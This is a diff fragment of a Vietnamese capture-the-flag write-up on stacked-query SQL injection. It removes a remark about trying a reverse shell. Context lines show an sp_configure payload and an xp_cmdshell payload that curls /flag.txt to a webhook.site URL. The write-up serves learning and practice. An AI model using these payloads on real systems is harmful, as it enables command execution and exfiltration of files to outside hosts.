@@ -148,7 +148,6 @@ Và dùng payload :  ";EXEC sp_configure 'show advanced options', 1;RECONFIGURE;
 
 Và vào webhook em nhận được
 ![Alt text](./imageStackQuery/image-5.png)
-- em tính revershell trên này mà để hôm sau em chuyển qua linux cho dễ ạ:v
 
 Em dùng payload này để lấy thông tin file flag.txt
 ;EXEC%20xp_cmdshell%20%27curl+-X+POST+--data+"@/flag.txt"+-H+"Content-Type:+application/data"+https://webhook.site/0e0a8778-5ef0-4657-8aec-84076f5a552e%27;%20WAITFOR%20DELAY%20%270:0:5%27;%20--%20%22
